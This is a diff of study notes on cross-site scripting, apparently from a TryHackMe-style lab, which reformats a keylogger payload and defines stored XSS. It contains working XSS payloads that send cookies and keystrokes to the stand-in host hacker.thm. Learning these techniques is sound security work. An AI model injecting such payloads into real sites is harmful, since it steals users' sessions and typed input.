@@ -45,13 +45,9 @@ You can use simple payloads like *<script>alert("11")</script>* to check for Ref
 	- <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 	- Keylogger :
 		```JS
-		<script>
-document.onkeypress = function(e) {
-fetch('https://hacker.thm/log?key=' + btoa(e.key));
-}
-</script>
-```
-	- 
+		<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>
+		```
+	
 
 ### Stored XSS:
 Stored XSS happens when an application saves attacker-controlled input on the server (in a database, normally) and later serves that content to other users without proper escaping, causing the injected script to run in every visitor’s browser.
